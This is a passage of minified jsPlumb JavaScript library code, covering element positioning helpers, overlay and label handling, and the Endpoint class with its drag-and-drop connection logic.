            }, e = b || null != c && a !== c && a.offsetParent !== c ? a.offsetParent : null, f = function(a) {
                null != a && a !== document.body && (a.scrollTop > 0 || a.scrollLeft > 0) && (d.left -= a.scrollLeft,
                d.top -= a.scrollTop)
            }
            .bind(this); null != e; )
                d.left += e.offsetLeft,
                d.top += e.offsetTop,
                f(e),
                e = b ? e.offsetParent : e.offsetParent === c ? null : e.offsetParent;
            if (null != c && !b && (c.scrollTop > 0 || c.scrollLeft > 0)) {
                var g = null != a.offsetParent ? this.getStyle(a.offsetParent, "position") : "static"
                  , h = this.getStyle(a, "position");
                "absolute" !== h && "fixed" !== h && "absolute" !== g && "fixed" !== g && (d.left -= c.scrollLeft,
                d.top -= c.scrollTop)
            }
            return d
        },
        getPositionOnElement: function(a, b, c) {
            var d = "undefined" != typeof b.getBoundingClientRect ? b.getBoundingClientRect() : {
                left: 0,
                top: 0,
                width: 0,
                height: 0
            }
              , e = document.body
              , f = document.documentElement
              , g = window.pageYOffset || f.scrollTop || e.scrollTop
              , h = window.pageXOffset || f.scrollLeft || e.scrollLeft
              , i = f.clientTop || e.clientTop || 0
              , j = f.clientLeft || e.clientLeft || 0
              , k = 0
              , l = 0
              , m = d.top + g - i + k * c
              , n = d.left + h - j + l * c
              , o = jsPlumb.pageLocation(a)
              , p = d.width || b.offsetWidth * c
              , q = d.height || b.offsetHeight * c
              , r = (o[0] - n) / p
              , s = (o[1] - m) / q;
            return [r, s]
        },
        getAbsolutePosition: function(a) {
            var b = function(b) {
                var c = a.style[b];
                if (c)
                    return parseFloat(c.substring(0, c.length - 2))
            };
            return [b("left"), b("top")]
        },
        setAbsolutePosition: function(a, b, c, d) {
            c ? this.animate(a, {
                left: "+=" + (b[0] - c[0]),
                top: "+=" + (b[1] - c[1])
            }, d) : (a.style.left = b[0] + "px",
            a.style.top = b[1] + "px")
        },
        getSize: function(a) {
            return [a.offsetWidth, a.offsetHeight]
        },
        getWidth: function(a) {
            return a.offsetWidth
        },
        getHeight: function(a) {
            return a.offsetHeight
        },
        getRenderMode: function() {
            return "svg"
        }
    })
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb
      , c = a.jsPlumbUtil
      , d = "__label"
      , e = function(a, c) {
        var e = {
            cssClass: c.cssClass,
            labelStyle: a.labelStyle,
            id: d,
            component: a,
            _jsPlumb: a._jsPlumb.instance
        }
          , f = b.extend(e, c);
        return new (b.Overlays[a._jsPlumb.instance.getRenderMode()].Label)(f)
    }
      , f = function(a, d) {
        var e = null;
        if (c.isArray(d)) {
            var f = d[0]
              , g = b.extend({
                component: a,
                _jsPlumb: a._jsPlumb.instance
            }, d[1]);
            3 === d.length && b.extend(g, d[2]),
            e = new (b.Overlays[a._jsPlumb.instance.getRenderMode()][f])(g)
        } else
            e = d.constructor === String ? new (b.Overlays[a._jsPlumb.instance.getRenderMode()][d])({
                component: a,
                _jsPlumb: a._jsPlumb.instance
            }) : d;
        return e.id = e.id || c.uuid(),
        a.cacheTypeItem("overlay", e, e.id),
        a._jsPlumb.overlays[e.id] = e,
        e
    };
    b.OverlayCapableJsPlumbUIComponent = function(b) {
        a.jsPlumbUIComponent.apply(this, arguments),
        this._jsPlumb.overlays = {},
        this._jsPlumb.overlayPositions = {},
        b.label && (this.getDefaultType().overlays[d] = ["Label", {
            label: b.label,
            location: b.labelLocation || this.defaultLabelLocation || .5,
            labelStyle: b.labelStyle || this._jsPlumb.instance.Defaults.LabelStyle,
            id: d
        }]),
        this.setListenerComponent = function(a) {
            if (this._jsPlumb)
                for (var b in this._jsPlumb.overlays)
                    this._jsPlumb.overlays[b].setListenerComponent(a)
        }
    }
    ,
    b.OverlayCapableJsPlumbUIComponent.applyType = function(a, b) {
        if (b.overlays) {
            var c, d = {};
            for (c in b.overlays) {
                var e = a._jsPlumb.overlays[b.overlays[c][1].id];
                if (e)
                    e.updateFrom(b.overlays[c][1]),
                    d[b.overlays[c][1].id] = !0;
                else {
                    var f = a.getCachedTypeItem("overlay", b.overlays[c][1].id);
                    null != f ? (f.reattach(a._jsPlumb.instance),
                    f.setVisible(!0),
                    f.updateFrom(b.overlays[c][1]),
                    a._jsPlumb.overlays[f.id] = f) : f = a.addOverlay(b.overlays[c], !0),
                    d[f.id] = !0
                }
            }
            for (c in a._jsPlumb.overlays)
                null == d[a._jsPlumb.overlays[c].id] && a.removeOverlay(a._jsPlumb.overlays[c].id, !0)
        }
    }
    ,
    c.extend(b.OverlayCapableJsPlumbUIComponent, a.jsPlumbUIComponent, {
        setHover: function(a, b) {
            if (this._jsPlumb && !this._jsPlumb.instance.isConnectionBeingDragged())
                for (var c in this._jsPlumb.overlays)
                    this._jsPlumb.overlays[c][a ? "addClass" : "removeClass"](this._jsPlumb.instance.hoverClass)
        },
        addOverlay: function(a, b) {
            var c = f(this, a);
            return b || this.repaint(),
            c
        },
        getOverlay: function(a) {
            return this._jsPlumb.overlays[a]
        },
        getOverlays: function() {
            return this._jsPlumb.overlays
        },
        hideOverlay: function(a) {
            var b = this.getOverlay(a);
            b && b.hide()
        },
        hideOverlays: function() {
            for (var a in this._jsPlumb.overlays)
                this._jsPlumb.overlays[a].hide()
        },
        showOverlay: function(a) {
            var b = this.getOverlay(a);
            b && b.show()
        },
        showOverlays: function() {
            for (var a in this._jsPlumb.overlays)
                this._jsPlumb.overlays[a].show()
        },
        removeAllOverlays: function(a) {
            for (var b in this._jsPlumb.overlays)
                this._jsPlumb.overlays[b].cleanup && this._jsPlumb.overlays[b].cleanup();
            this._jsPlumb.overlays = {},
            this._jsPlumb.overlayPositions = null,
            a || this.repaint()
        },
        removeOverlay: function(a, b) {
            var c = this._jsPlumb.overlays[a];
            c && (c.setVisible(!1),
            !b && c.cleanup && c.cleanup(),
            delete this._jsPlumb.overlays[a],
            this._jsPlumb.overlayPositions && delete this._jsPlumb.overlayPositions[a])
        },
        removeOverlays: function() {
            for (var a = 0, b = arguments.length; a < b; a++)
                this.removeOverlay(arguments[a])
        },
        moveParent: function(a) {
            if (this.bgCanvas && (this.bgCanvas.parentNode.removeChild(this.bgCanvas),
            a.appendChild(this.bgCanvas)),
            this.canvas && this.canvas.parentNode) {
                this.canvas.parentNode.removeChild(this.canvas),
                a.appendChild(this.canvas);
                for (var b in this._jsPlumb.overlays)
                    if (this._jsPlumb.overlays[b].isAppendedAtTopLevel) {
                        var c = this._jsPlumb.overlays[b].getElement();
                        c.parentNode.removeChild(c),
                        a.appendChild(c)
                    }
            }
        },
        getLabel: function() {
            var a = this.getOverlay(d);
            return null != a ? a.getLabel() : null
        },
        getLabelOverlay: function() {
            return this.getOverlay(d)
        },
        setLabel: function(a) {
            var b = this.getOverlay(d);
            if (b)
                a.constructor === String || a.constructor === Function ? b.setLabel(a) : (a.label && b.setLabel(a.label),
                a.location && b.setLocation(a.location));
            else {
                var c = a.constructor === String || a.constructor === Function ? {
                    label: a
                } : a;
                b = e(this, c),
                this._jsPlumb.overlays[d] = b
            }
            this._jsPlumb.instance.isSuspendDrawing() || this.repaint()
        },
        cleanup: function(a) {
            for (var b in this._jsPlumb.overlays)
                this._jsPlumb.overlays[b].cleanup(a),
                this._jsPlumb.overlays[b].destroy(a);
            a && (this._jsPlumb.overlays = {},
            this._jsPlumb.overlayPositions = null)
        },
        setVisible: function(a) {
            this[a ? "showOverlays" : "hideOverlays"]()
        },
        setAbsoluteOverlayPosition: function(a, b) {
            this._jsPlumb.overlayPositions[a.id] = b
        },
        getAbsoluteOverlayPosition: function(a) {
            return this._jsPlumb.overlayPositions ? this._jsPlumb.overlayPositions[a.id] : null
        },
        _clazzManip: function(a, b, c) {
            if (!c)
                for (var d in this._jsPlumb.overlays)
                    this._jsPlumb.overlays[d][a + "Class"](b)
        },
        addClass: function(a, b) {
            this._clazzManip("add", a, b)
        },
        removeClass: function(a, b) {
            this._clazzManip("remove", a, b)
        }
    })
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb
      , c = a.jsPlumbUtil
      , d = function(a, b, c) {
        var d = !1;
        return {
            drag: function() {
                if (d)
                    return d = !1,
                    !0;
                if (b.element) {
                    var e = c.getUIPosition(arguments, c.getZoom());
                    null != e && c.setPosition(b.element, e),
                    c.repaint(b.element, e),
                    a.paint({
                        anchorPoint: a.anchor.getCurrentLocation({
                            element: a
                        })
                    })
                }
            },
            stopDrag: function() {
                d = !0
            }
        }
    }
      , e = function(a, b, c, d) {
        var e = b.createElement("div", {
            position: "absolute"
        });
        b.appendElement(e);
        var f = b.getId(e);
        b.setPosition(e, c),
        e.style.width = d[0] + "px",
        e.style.height = d[1] + "px",
        b.manage(f, e, !0),
        a.id = f,
        a.element = e
    }
      , f = function(a, c, d, e, f, g, h, i) {
        var j = new b.FloatingAnchor({
            reference: c,
            referenceCanvas: e,
            jsPlumbInstance: g
        });
        return h({
            paintStyle: a,
            endpoint: d,
            anchor: j,
            source: f,
            scope: i
        })
    }
      , g = ["connectorStyle", "connectorHoverStyle", "connectorOverlays", "connector", "connectionType", "connectorClass", "connectorHoverClass"]
      , h = function(a, b) {
        var c = 0;
        if (null != b)
            for (var d = 0; d < a.connections.length; d++)
                if (a.connections[d].sourceId === b || a.connections[d].targetId === b) {
                    c = d;
                    break
                }
        return a.connections[c]
    };
    b.Endpoint = function(a) {
        var i = a._jsPlumb
          , j = a.newConnection
          , k = a.newEndpoint;
        this.idPrefix = "_jsplumb_e_",
        this.defaultLabelLocation = [.5, .5],
        this.defaultOverlayKeys = ["Overlays", "EndpointOverlays"],
        b.OverlayCapableJsPlumbUIComponent.apply(this, arguments),
        this.appendToDefaultType({
            connectionType: a.connectionType,
            maxConnections: null == a.maxConnections ? this._jsPlumb.instance.Defaults.MaxConnections : a.maxConnections,
            paintStyle: a.endpointStyle || a.paintStyle || a.style || this._jsPlumb.instance.Defaults.EndpointStyle || b.Defaults.EndpointStyle,
            hoverPaintStyle: a.endpointHoverStyle || a.hoverPaintStyle || this._jsPlumb.instance.Defaults.EndpointHoverStyle || b.Defaults.EndpointHoverStyle,
            connectorStyle: a.connectorStyle,
            connectorHoverStyle: a.connectorHoverStyle,
            connectorClass: a.connectorClass,
            connectorHoverClass: a.connectorHoverClass,
            connectorOverlays: a.connectorOverlays,
            connector: a.connector,
            connectorTooltip: a.connectorTooltip
        }),
        this._jsPlumb.enabled = !(a.enabled === !1),
        this._jsPlumb.visible = !0,
        this.element = b.getElement(a.source),
        this._jsPlumb.uuid = a.uuid,
        this._jsPlumb.floatingEndpoint = null;
        var l = null;
        this._jsPlumb.uuid && (a.endpointsByUUID[this._jsPlumb.uuid] = this),
        this.elementId = a.elementId,
        this.dragProxy = a.dragProxy,
        this._jsPlumb.connectionCost = a.connectionCost,
        this._jsPlumb.connectionsDirected = a.connectionsDirected,
        this._jsPlumb.currentAnchorClass = "",
        this._jsPlumb.events = {};
        var m = a.deleteOnEmpty === !0;
        this.setDeleteOnEmpty = function(a) {
            m = a
        }
        ;
        var n = function() {
            var a = i.endpointAnchorClassPrefix + "-" + this._jsPlumb.currentAnchorClass;
            this._jsPlumb.currentAnchorClass = this.anchor.getCssClass();
            var c = i.endpointAnchorClassPrefix + (this._jsPlumb.currentAnchorClass ? "-" + this._jsPlumb.currentAnchorClass : "");
            this.removeClass(a),
            this.addClass(c),
            b.updateClasses(this.element, c, a)
        }
        .bind(this);
        this.prepareAnchor = function(a) {
            var b = this._jsPlumb.instance.makeAnchor(a, this.elementId, i);
            return b.bind("anchorChanged", function(a) {
                this.fire("anchorChanged", {
                    endpoint: this,
                    anchor: a
                }),
                n()
            }
            .bind(this)),
            b
        }
        ,
        this.setPreparedAnchor = function(a, b) {
            return this._jsPlumb.instance.continuousAnchorFactory.clear(this.elementId),
            this.anchor = a,
            n(),
            b || this._jsPlumb.instance.repaint(this.elementId),
            this
        }
        ,
        this.setAnchor = function(a, b) {
            var c = this.prepareAnchor(a);
            return this.setPreparedAnchor(c, b),
            this
        }
        ;
        var o = function(a) {
            if (this.connections.length > 0)
                for (var b = 0; b < this.connections.length; b++)
                    this.connections[b].setHover(a, !1);
            else
                this.setHover(a)
        }
        .bind(this);
        this.bind("mouseover", function() {
            o(!0)
        }),
        this.bind("mouseout", function() {
            o(!1)
        }),
        a._transient || this._jsPlumb.instance.anchorManager.add(this, this.elementId),
        this.prepareEndpoint = function(d, e) {
            var f, g = function(a, c) {
                var d = i.getRenderMode();
                if (b.Endpoints[d][a])
                    return new b.Endpoints[d][a](c);
                if (!i.Defaults.DoNotThrowErrors)
                    throw {
                        msg: "jsPlumb: unknown endpoint type '" + a + "'"
                    }
            }, h = {
                _jsPlumb: this._jsPlumb.instance,
                cssClass: a.cssClass,
                container: a.container,
                tooltip: a.tooltip,
                connectorTooltip: a.connectorTooltip,
                endpoint: this
            };
            return c.isString(d) ? f = g(d, h) : c.isArray(d) ? (h = c.merge(d[1], h),
            f = g(d[0], h)) : f = d.clone(),
            f.clone = function() {
                return c.isString(d) ? g(d, h) : c.isArray(d) ? (h = c.merge(d[1], h),
                g(d[0], h)) : void 0
            }
            .bind(this),
            f.typeId = e,
            f
        }
        ,
        this.setEndpoint = function(a, b) {
            var c = this.prepareEndpoint(a);
            this.setPreparedEndpoint(c, !0)
        }
        ,
        this.setPreparedEndpoint = function(a, b) {
            null != this.endpoint && (this.endpoint.cleanup(),
            this.endpoint.destroy()),
            this.endpoint = a,
            this.type = this.endpoint.type,
            this.canvas = this.endpoint.canvas
        }
        ,
        b.extend(this, a, g),
        this.isSource = a.isSource || !1,
        this.isTemporarySource = a.isTemporarySource || !1,
        this.isTarget = a.isTarget || !1,
        this.connections = a.connections || [],
        this.connectorPointerEvents = a["connector-pointer-events"],
        this.scope = a.scope || i.getDefaultScope(),
        this.timestamp = null,
        this.reattachConnections = a.reattach || i.Defaults.ReattachConnections,
        this.connectionsDetachable = i.Defaults.ConnectionsDetachable,
        a.connectionsDetachable !== !1 && a.detachable !== !1 || (this.connectionsDetachable = !1),
        this.dragAllowedWhenFull = a.dragAllowedWhenFull !== !1,
        a.onMaxConnections && this.bind("maxConnections", a.onMaxConnections),
        this.addConnection = function(a) {
            this.connections.push(a),
            this[(this.connections.length > 0 ? "add" : "remove") + "Class"](i.endpointConnectedClass),
            this[(this.isFull() ? "add" : "remove") + "Class"](i.endpointFullClass)
        }
        ,
        this.detachFromConnection = function(a, b, c) {
            b = null == b ? this.connections.indexOf(a) : b,
            b >= 0 && (this.connections.splice(b, 1),
            this[(this.connections.length > 0 ? "add" : "remove") + "Class"](i.endpointConnectedClass),
            this[(this.isFull() ? "add" : "remove") + "Class"](i.endpointFullClass)),
            !c && m && 0 === this.connections.length && i.deleteObject({
                endpoint: this,
                fireEvent: !1,
                deleteAttachedObjects: c !== !0
            })
        }
        ,
        this.deleteEveryConnection = function(a) {
            for (var b = this.connections.length, c = 0; c < b; c++)
                i.deleteConnection(this.connections[0], a)
        }
        ,
        this.detachFrom = function(a, b, c) {
            for (var d = [], e = 0; e < this.connections.length; e++)
                this.connections[e].endpoints[1] !== a && this.connections[e].endpoints[0] !== a || d.push(this.connections[e]);
            for (var f = 0, g = d.length; f < g; f++)
                i.deleteConnection(d[0]);
            return this
        }
        ,
        this.getElement = function() {
            return this.element
        }
        ,
        this.setElement = function(d) {
            var e = this._jsPlumb.instance.getId(d)
              , f = this.elementId;
            return c.removeWithFunction(a.endpointsByElement[this.elementId], function(a) {
                return a.id === this.id
            }
            .bind(this)),
            this.element = b.getElement(d),
            this.elementId = i.getId(this.element),
            i.anchorManager.rehomeEndpoint(this, f, this.element),
            i.dragManager.endpointAdded(this.element),
            c.addToList(a.endpointsByElement, e, this),
            this
        }
        ,
        this.makeInPlaceCopy = function() {
            var b = this.anchor.getCurrentLocation({
                element: this
            })
              , c = this.anchor.getOrientation(this)
              , d = this.anchor.getCssClass()
              , e = {
                bind: function() {},
                compute: function() {
                    return [b[0], b[1]]
                },
                getCurrentLocation: function() {
                    return [b[0], b[1]]
                },
                getOrientation: function() {
                    return c
                },
                getCssClass: function() {
                    return d
                }
            };
            return k({
                dropOptions: a.dropOptions,
                anchor: e,
                source: this.element,
                paintStyle: this.getPaintStyle(),
                endpoint: a.hideOnDrag ? "Blank" : this.endpoint,
                _transient: !0,
                scope: this.scope,
                reference: this
            })
        }
        ,
        this.connectorSelector = function() {
            var a = this.connections[0];
            return a ? a : this.connections.length < this._jsPlumb.maxConnections || this._jsPlumb.maxConnections === -1 ? null : a
        }
        ,
        this.setStyle = this.setPaintStyle,
        this.paint = function(a) {
            a = a || {};
            var b = a.timestamp
              , c = !(a.recalc === !1);
            if (!b || this.timestamp !== b) {
                var d = i.updateOffset({
                    elId: this.elementId,
                    timestamp: b
                })
                  , e = a.offset ? a.offset.o : d.o;
                if (null != e) {
                    var f = a.anchorPoint
                      , g = a.connectorPaintStyle;
                    if (null == f) {
                        var j = a.dimensions || d.s
                          , k = {
                            xy: [e.left, e.top],
                            wh: j,
                            element: this,
                            timestamp: b
                        };
                        if (c && this.anchor.isDynamic && this.connections.length > 0) {
                            var l = h(this, a.elementWithPrecedence)
                              , m = l.endpoints[0] === this ? 1 : 0
                              , n = 0 === m ? l.sourceId : l.targetId
                              , o = i.getCachedData(n)
                              , p = o.o
                              , q = o.s;
                            k.txy = [p.left, p.top],
                            k.twh = q,
                            k.tElement = l.endpoints[m]
                        }
                        f = this.anchor.compute(k)
                    }
                    this.endpoint.compute(f, this.anchor.getOrientation(this), this._jsPlumb.paintStyleInUse, g || this.paintStyleInUse),
                    this.endpoint.paint(this._jsPlumb.paintStyleInUse, this.anchor),
                    this.timestamp = b;
                    for (var r in this._jsPlumb.overlays)
                        if (this._jsPlumb.overlays.hasOwnProperty(r)) {
                            var s = this._jsPlumb.overlays[r];
                            s.isVisible() && (this._jsPlumb.overlayPlacements[r] = s.draw(this.endpoint, this._jsPlumb.paintStyleInUse),
                            s.paint(this._jsPlumb.overlayPlacements[r]))
                        }
                }
            }
        }
        ,
        this.getTypeDescriptor = function() {
            return "endpoint"
        }
        ,
        this.isVisible = function() {
            return this._jsPlumb.visible
        }
        ,
        this.repaint = this.paint;
        var p = !1;
        this.initDraggable = function() {
            if (!p && b.isDragSupported(this.element)) {
                var g, h = {
                    id: null,
                    element: null
                }, m = null, n = !1, o = null, q = d(this, h, i), r = a.dragOptions || {}, s = {}, t = b.dragEvents.start, u = b.dragEvents.stop, v = b.dragEvents.drag, w = b.dragEvents.beforeStart, x = function(a) {
                    g = a.e.payload || {}
                }, y = function(d) {
                    m = this.connectorSelector();
                    var l = !0;
                    this.isEnabled() || (l = !1),
                    null != m || this.isSource || this.isTemporarySource || (l = !1),
                    !this.isSource || !this.isFull() || null != m && this.dragAllowedWhenFull || (l = !1),
                    null == m || m.isDetachable(this) || (l = !1);
                    var p = i.checkCondition(null == m ? "beforeDrag" : "beforeStartDetach", {
                        endpoint: this,
                        source: this.element,
                        sourceId: this.elementId,
                        connection: m
                    });
                    if (p === !1 ? l = !1 : "object" == typeof p ? b.extend(p, g || {}) : p = g || {},
                    l === !1)
                        return i.stopDrag && i.stopDrag(this.canvas),
                        q.stopDrag(),
                        !1;
                    for (var r = 0; r < this.connections.length; r++)
                        this.connections[r].setHover(!1);
                    this.addClass("endpointDrag"),
                    i.setConnectionBeingDragged(!0),
                    m && !this.isFull() && this.isSource && (m = null),
                    i.updateOffset({
                        elId: this.elementId
                    });
                    var s = this._jsPlumb.instance.getOffset(this.canvas)
                      , t = this.canvas
                      , u = this._jsPlumb.instance.getSize(this.canvas);
                    e(h, i, s, u),
                    i.setAttributes(this.canvas, {
                        dragId: h.id,
                        elId: this.elementId
                    });
                    var v = this.dragProxy || this.endpoint;
                    if (null == this.dragProxy && null != this.connectionType) {
                        var w = this._jsPlumb.instance.deriveEndpointAndAnchorSpec(this.connectionType);
                        w.endpoints[1] && (v = w.endpoints[1])
                    }
                    var x = this._jsPlumb.instance.makeAnchor("Center");
                    x.isFloating = !0,
                    this._jsPlumb.floatingEndpoint = f(this.getPaintStyle(), x, v, this.canvas, h.element, i, k, this.scope);
                    var y = this._jsPlumb.floatingEndpoint.anchor;
                    if (null == m)
                        this.setHover(!1, !1),
                        m = j({
                            sourceEndpoint: this,
                            targetEndpoint: this._jsPlumb.floatingEndpoint,
                            source: this.element,
                            target: h.element,
                            anchors: [this.anchor, this._jsPlumb.floatingEndpoint.anchor],
                            paintStyle: a.connectorStyle,
                            hoverPaintStyle: a.connectorHoverStyle,
                            connector: a.connector,
                            overlays: a.connectorOverlays,
                            type: this.connectionType,
                            cssClass: this.connectorClass,
                            hoverClass: this.connectorHoverClass,
                            scope: a.scope,
                            data: p
                        }),
                        m.pending = !0,
                        m.addClass(i.draggingClass),
                        this._jsPlumb.floatingEndpoint.addClass(i.draggingClass),
                        this._jsPlumb.floatingEndpoint.anchor = y,
                        i.fire("connectionDrag", m),
                        i.anchorManager.newConnection(m);
                    else {
                        n = !0,
                        m.setHover(!1);
                        var z = m.endpoints[0].id === this.id ? 0 : 1;
                        this.detachFromConnection(m, null, !0);
                        var A = i.getDragScope(t);
                        i.setAttribute(this.canvas, "originalScope", A),
                        i.fire("connectionDrag", m),
                        0 === z ? (o = [m.source, m.sourceId, t, A],
                        i.anchorManager.sourceChanged(m.endpoints[z].elementId, h.id, m, h.element)) : (o = [m.target, m.targetId, t, A],
                        m.target = h.element,
                        m.targetId = h.id,
                        i.anchorManager.updateOtherEndpoint(m.sourceId, m.endpoints[z].elementId, m.targetId, m)),
                        m.suspendedEndpoint = m.endpoints[z],
                        m.suspendedElement = m.endpoints[z].getElement(),
                        m.suspendedElementId = m.endpoints[z].elementId,
                        m.suspendedElementType = 0 === z ? "source" : "target",
                        m.suspendedEndpoint.setHover(!1),
                        this._jsPlumb.floatingEndpoint.referenceEndpoint = m.suspendedEndpoint,
                        m.endpoints[z] = this._jsPlumb.floatingEndpoint,
                        m.addClass(i.draggingClass),
                        this._jsPlumb.floatingEndpoint.addClass(i.draggingClass)
                    }
                    i.floatingConnections[h.id] = m,
                    c.addToList(a.endpointsByElement, h.id, this._jsPlumb.floatingEndpoint),
                    i.currentlyDragging = !0
                }
                .bind(this), z = function() {
                    if (i.setConnectionBeingDragged(!1),
                    m && null != m.endpoints) {
                        var a = i.getDropEvent(arguments)
                          , b = i.getFloatingAnchorIndex(m);
                        if (m.endpoints[0 === b ? 1 : 0].anchor.locked = !1,
                        m.removeClass(i.draggingClass),
                        this._jsPlumb && (m.deleteConnectionNow || m.endpoints[b] === this._jsPlumb.floatingEndpoint) && n && m.suspendedEndpoint) {
                            0 === b ? (m.floatingElement = m.source,
                            m.floatingId = m.sourceId,
                            m.floatingEndpoint = m.endpoints[0],
                            m.floatingIndex = 0,
                            m.source = o[0],
                            m.sourceId = o[1]) : (m.floatingElement = m.target,
                            m.floatingId = m.targetId,
                            m.floatingEndpoint = m.endpoints[1],
                            m.floatingIndex = 1,
                            m.target = o[0],
                            m.targetId = o[1]);
                            var c = this._jsPlumb.floatingEndpoint;
                            i.setDragScope(o[2], o[3]),
                            m.endpoints[b] = m.suspendedEndpoint,
                            m.isReattach() || m._forceReattach || m._forceDetach || !i.deleteConnection(m) ? (m.setHover(!1),
                            m._forceDetach = null,
                            m._forceReattach = null,
                            this._jsPlumb.floatingEndpoint.detachFromConnection(m),
                            m.suspendedEndpoint.addConnection(m),
                            1 === b ? i.anchorManager.updateOtherEndpoint(m.sourceId, m.floatingId, m.targetId, m) : i.anchorManager.sourceChanged(m.floatingId, m.sourceId, m, m.source),
                            i.repaint(o[1])) : i.deleteObject({
                                endpoint: c
                            })
                        }
                        this.deleteAfterDragStop ? i.deleteObject({
                            endpoint: this
                        }) : this._jsPlumb && this.paint({
                            recalc: !1
                        }),
                        i.fire("connectionDragStop", m, a),
                        m.pending && i.fire("connectionAborted", m, a),
                        i.currentlyDragging = !1,
                        m.suspendedElement = null,
                        m.suspendedEndpoint = null,
                        m = null
                    }
                    h && h.element && i.remove(h.element, !1, !1),
                    l && i.deleteObject({
                        endpoint: l
                    }),
                    this._jsPlumb && (this.canvas.style.visibility = "visible",
                    this.anchor.locked = !1,
                    this._jsPlumb.floatingEndpoint = null)
                }
                .bind(this);
                r = b.extend(s, r),
                r.scope = this.scope || r.scope,
                r[w] = c.wrap(r[w], x, !1),
                r[t] = c.wrap(r[t], y, !1),
                r[v] = c.wrap(r[v], q.drag),
                r[u] = c.wrap(r[u], z),
                r.multipleDrop = !1,
                r.canDrag = function() {
                    return this.isSource || this.isTemporarySource || this.connections.length > 0
                }
                .bind(this),
                i.initDraggable(this.canvas, r, "internal"),
                this.canvas._jsPlumbRelatedElement = this.element,
                p = !0
            }
        }
        ;
        var q = a.endpoint || this._jsPlumb.instance.Defaults.Endpoint || b.Defaults.Endpoint;
        this.setEndpoint(q, !0);
        var r = a.anchor ? a.anchor : a.anchors ? a.anchors : i.Defaults.Anchor || "Top";
        this.setAnchor(r, !0);
        var s = ["default", a.type || ""].join(" ");
        this.addType(s, a.data, !0),
        this.canvas = this.endpoint.canvas,
        this.canvas._jsPlumb = this,
        this.initDraggable();
        var t = function(d, e, f, g) {
            if (b.isDropSupported(this.element)) {
                var h = a.dropOptions || i.Defaults.DropOptions || b.Defaults.DropOptions;
                h = b.extend({}, h),
                h.scope = h.scope || this.scope;
                var j = b.dragEvents.drop
                  , k = b.dragEvents.over
                  , l = b.dragEvents.out
                  , m = this
                  , n = i.EndpointDropHandler({
                    getEndpoint: function() {
                        return m
                    },
                    jsPlumb: i,
                    enabled: function() {
                        return null == f || f.isEnabled()
                    },
                    isFull: function() {
                        return f.isFull()
                    },
                    element: this.element,
                    elementId: this.elementId,
                    isSource: this.isSource,
                    isTarget: this.isTarget,
                    addClass: function(a) {
                        m.addClass(a)
                    },
                    removeClass: function(a) {
                        m.removeClass(a)
                    },
                    isDropAllowed: function() {
                        return m.isDropAllowed.apply(m, arguments)
                    },
                    reference: g,
                    isRedrop: function(a, b) {
                        return a.suspendedEndpoint && b.reference && a.suspendedEndpoint.id === b.reference.id
                    }
                });
                h[j] = c.wrap(h[j], n, !0),
                h[k] = c.wrap(h[k], function() {
                    var a = b.getDragObject(arguments)
                      , c = i.getAttribute(b.getElement(a), "dragId")
                      , d = i.floatingConnections[c];
                    if (null != d) {
                        var e = i.getFloatingAnchorIndex(d)
                          , f = this.isTarget && 0 !== e || d.suspendedEndpoint && this.referenceEndpoint && this.referenceEndpoint.id === d.suspendedEndpoint.id;
                        if (f) {
                            var g = i.checkCondition("checkDropAllowed", {
                                sourceEndpoint: d.endpoints[e],
                                targetEndpoint: this,
                                connection: d
                            });
                            this[(g ? "add" : "remove") + "Class"](i.endpointDropAllowedClass),
                            this[(g ? "remove" : "add") + "Class"](i.endpointDropForbiddenClass),
                            d.endpoints[e].anchor.over(this.anchor, this)
                        }
                    }
                }
                .bind(this)),
                h[l] = c.wrap(h[l], function() {
                    var a = b.getDragObject(arguments)
                      , c = null == a ? null : i.getAttribute(b.getElement(a), "dragId")
                      , d = c ? i.floatingConnections[c] : null;
                    if (null != d) {
                        var e = i.getFloatingAnchorIndex(d)
                          , f = this.isTarget && 0 !== e || d.suspendedEndpoint && this.referenceEndpoint && this.referenceEndpoint.id === d.suspendedEndpoint.id;
                        f && (this.removeClass(i.endpointDropAllowedClass),
                        this.removeClass(i.endpointDropForbiddenClass),
                        d.endpoints[e].anchor.out())
                    }
                }
                .bind(this)),
                i.initDroppable(d, h, "internal", e)
            }
        }
        .bind(this);
        return this.anchor.isFloating || t(this.canvas, !(a._transient || this.anchor.isFloating), this, a.reference),
        this
    }
    ,
    c.extend(b.Endpoint, b.OverlayCapableJsPlumbUIComponent, {
        setVisible: function(a, b, c) {
            if (this._jsPlumb.visible = a,
            this.canvas && (this.canvas.style.display = a ? "block" : "none"),
            this[a ? "showOverlays" : "hideOverlays"](),
            !b)
                for (var d = 0; d < this.connections.length; d++)
                    if (this.connections[d].setVisible(a),
                    !c) {
                        var e = this === this.connections[d].endpoints[0] ? 1 : 0;
                        1 === this.connections[d].endpoints[e].connections.length && this.connections[d].endpoints[e].setVisible(a, !0, !0)
                    }
        },
        getAttachedElements: function() {
            return this.connections
        },
        applyType: function(a, c) {
            this.setPaintStyle(a.endpointStyle || a.paintStyle, c),
            this.setHoverPaintStyle(a.endpointHoverStyle || a.hoverPaintStyle, c),
            null != a.maxConnections && (this._jsPlumb.maxConnections = a.maxConnections),
            a.scope && (this.scope = a.scope),
            b.extend(this, a, g),
            null != a.cssClass && this.canvas && this._jsPlumb.instance.addClass(this.canvas, a.cssClass),
            b.OverlayCapableJsPlumbUIComponent.applyType(this, a)
        },
        isEnabled: function() {
            return this._jsPlumb.enabled
        },
        setEnabled: function(a) {
            this._jsPlumb.enabled = a
        },
        cleanup: function() {
            var a = this._jsPlumb.instance.endpointAnchorClassPrefix + (this._jsPlumb.currentAnchorClass ? "-" + this._jsPlumb.currentAnchorClass : "");
            b.removeClass(this.element, a),
            this.anchor = null,
            this.endpoint.cleanup(!0),
            this.endpoint.destroy(),
            this.endpoint = null,
            this._jsPlumb.instance.destroyDraggable(this.canvas, "internal"),
            this._jsPlumb.instance.destroyDroppable(this.canvas, "internal")
        },
        setHover: function(a) {
            this.endpoint && this._jsPlumb && !this._jsPlumb.instance.isConnectionBeingDragged() && this.endpoint.setHover(a)
        },
        isFull: function() {
            return 0 === this._jsPlumb.maxConnections || !(this.isFloating() || this._jsPlumb.maxConnections < 0 || this.connections.length < this._jsPlumb.maxConnections)
        },
        isFloating: function() {
            return null != this.anchor && this.anchor.isFloating
        },
        isConnectedTo: function(a) {
            var b = !1;
            if (a)
                for (var c = 0; c < this.connections.length; c++)
